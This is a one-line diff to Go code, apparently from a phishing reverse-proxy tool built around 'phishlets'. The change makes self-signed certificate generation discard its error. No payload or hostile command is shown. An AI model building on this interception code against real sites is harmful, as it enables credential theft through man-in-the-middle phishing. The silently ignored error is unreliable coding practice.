@@ -1106,7 +1106,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 					}
 				} else {
 					// If hostname has no phishlet, generate self-signed certificate
-					cert, err = p.crt_db.SignCertificateForHost(hostname, "", port)
+					cert, _ = p.crt_db.SignCertificateForHost(hostname, "", port)
 				}
 			}
 			if cert != nil {
